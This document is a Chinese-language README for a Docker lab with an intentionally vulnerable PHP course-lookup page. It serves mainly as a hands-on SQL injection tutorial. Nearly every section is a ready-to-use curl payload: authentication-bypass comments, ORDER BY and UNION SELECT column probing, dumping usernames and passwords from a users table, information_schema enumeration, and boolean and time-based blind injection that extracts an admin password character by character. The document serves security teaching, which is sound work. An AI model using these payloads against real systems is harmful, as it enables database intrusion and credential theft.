# 環境建置

1. 安裝 docker 與 docker compose
2. 複製 env.example 為 .env
3. 執行 docker compose up -d

## 進入 mysql

```bash
docker compose exec mysql mysql -u root -p
# root_password
```

## 測試

```bash
curl http://192.168.64.130:8080/getcos.php?no=C003
```

## 測試注入

```bash
# $sql = "SELECT * FROM 課程表 where 課程編號 = '$no' and 學分 > 2";
curl http://192.168.64.130:8080/getcos.php?no=C001
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20--%20%27 # ' -- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20or%201=1%20--%20%27 # ' or 1=1 -- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20or%201=1%20%23 # ' or 1=1 #' %23

```

## 測試欄位長度

```bash
# SELECT * FROM 課程表 where 課程編號 = 'C001' ORDER BY 3 -- '' and 學分 > 2
# SELECT * FROM 課程表 where 課程編號 = 'C001' ORDER BY 4 -- '' and 學分 > 2
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20ORDER%20BY%203%20--%20%27 # ' ORDER BY 3 -- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20ORDER%20BY%204%20--%20%27 # ' ORDER BY 4 -- '

```

## 測試 UNION SELECT NULL

```bash
# ' UNION SELECT NULL--
# ' UNION SELECT NULL,NULL--
# ' UNION SELECT NULL,NULL,NULL--
# ' UNION SELECT NULL,NULL,NULL,NULL--

curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20NULL--%20%27 # ' UNION SELECT NULL-- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20NULL,NULL--%20%27 # ' UNION SELECT NULL,NULL-- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20NULL,NULL,NULL--%20%27 # ' UNION SELECT NULL,NULL,NULL--
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL--%20%27 # ' UNION SELECT NULL,NULL,NULL,NULL-- '
```

## 確認欄位型態 (mysql 會自動處理因此無效)

```bash
# ' UNION SELECT 'a', NULL, NULL-- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20'a',NULL,NULL--%20%27
# ' UNION SELECT NULL, 'a' ,NULL-- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20NULL,'a',NULL--%20%27
# ' UNION SELECT NULL, NULL, 'a'-- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20NULL,NULL,'a'--%20%27


```

## 測試跨表 (users)

```bash
# ' UNION SELECT username, password , null FROM users-- '
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20username,password,null%20FROM%20users--%20%27
# ' UNION SELECT concat(username,'~',password) , NULL , NULL FROM users --
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20concat(username,'~',password),NULL,NULL%20FROM%20users%20--%20%27

```

## 加入資料庫版本

```bash
# ' UNION SELECT @@version() , NULL , NULL FROM users --
curl http://192.168.64.130:8080/getcos.php?no=C001%27%20UNION%20SELECT%20@@version,NULL,NULL%20FROM%20users%20--%20%27

```

## 取得資料庫資料

```sql
-- 1. 取得資料庫清單
SELECT schema_name
FROM information_schema.schemata;
-- 2. 取得該資料庫中的所有資料表
SELECT table_name
FROM information_schema.tables
WHERE table_schema='my_database';
-- 3. 取得該資料表中的所有欄位
SELECT column_name
FROM information_schema.columns
WHERE table_name='users' and table_schema='my_database'; -- 課程表  , 學生表
-- 4. 取得資料
SELECT * FROM users;

```

## 測試盲注

有 SQL INJECTION 但沒有錯誤訊息

```bash

# 條件
curl http://192.168.64.130:8080/getconf.php?no=C00 -- Not Exist
curl http://192.168.64.130:8080/getconf.php?no=C001 -- Exist

# ' Union SELECT 'a' , null ,null From users where username = 'admin' and substring(password,1,1)='d' -- '
curl http://192.168.64.130:8080/getconf.php?no=C00%27%20Union%20SELECT%20'a'%20,null,null%20From%20users%20where%20username%20=%20'admin'and%20substring(password,1,1)='a'%20--%20%27
curl http://192.168.64.130:8080/getconf.php?no=C00%27%20Union%20SELECT%20'a'%20,null,null%20From%20users%20where%20username%20=%20'admin'and%20substring(password,1,1)='d'%20--%20%27

# mysql  SLEEP (3)
curl http://192.168.64.130:8080/getconf.php?no=C00%27%20Union%20SELECT%20'a'%20,SLEEP(3),null%20From%20users%20where%20username%20=%20'admin'and%20substring(password,1,1)='d'%20--%20%27

```
